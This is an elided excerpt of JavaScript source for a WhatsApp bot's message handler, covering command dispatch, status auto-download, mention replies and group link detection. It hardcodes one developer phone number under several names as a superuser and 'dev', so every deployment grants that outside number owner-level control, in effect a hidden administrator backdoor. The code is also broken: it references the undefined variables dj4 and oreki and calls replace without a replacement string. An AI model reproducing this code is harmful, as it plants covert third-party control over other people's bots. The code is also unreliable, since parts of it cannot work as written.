        ...
        async function main() {
            ...
            zk.ev.on("messages.upsert", async (m) => {
              ...
              //  console.log(ms) ;
                ...
                const dj = '24162698635';
                const dj2 = '24162698635';
                const dj3 = "24162698635";
                const OREKI = "24162698635"
                const sudo = await getAllSudoNumbers();
                const superUserNumbers = [servBot, dj, dj2, dj3,dj4, OREKI, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                const allAllowedNumbers = superUserNumbers.concat(sudo);
                const superUser = allAllowedNumbers.includes(auteurMessage);
                
                var dev = [dj, dj2,dj3,dj4,oreki].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
                ...
                var verifOREKIAdmin = verifGroupe ? admins.includes(idBot) : false;
                /** ** */
                var etat =conf.ETAT;
                if(etat==1)
                ...
                if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.TELECHARGER_AUTO_STATUS === "oui") {
                    ...
                    // console.log("*nouveau status* ");
                     ...
                     if (ms && ms.message.stickerMessage) {
                        ...
                        const cd = evt.cm.find((oreki) => oreki.nomCom === (cmd));
                        if (cd) {
                            try {
                  ...
                  try {
                    ...
                    if (ms.message[mtype].contextInfo.mentionedJid && (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))    /*texte.includes(idBot.split('@')[0]) || texte.includes(conf.NUMERO_OWNER)*/) {
                        ...
                        ok.sendMessage(origineMessage,msg,{quoted : ms})
            ...
            if ((texte.includes('https://') || texte.includes('http://') ) && verifGroupe &&  yes  ) {
             ...
             console.log("lien detecté")
                var veriforekiAdmin = verifGroupe ? admins.includes(idBot) : false;
                 ...
                 if(superUser || verifAdmin || !veriforekiAdmin  ) { console.log('je ne fais rien'); return};
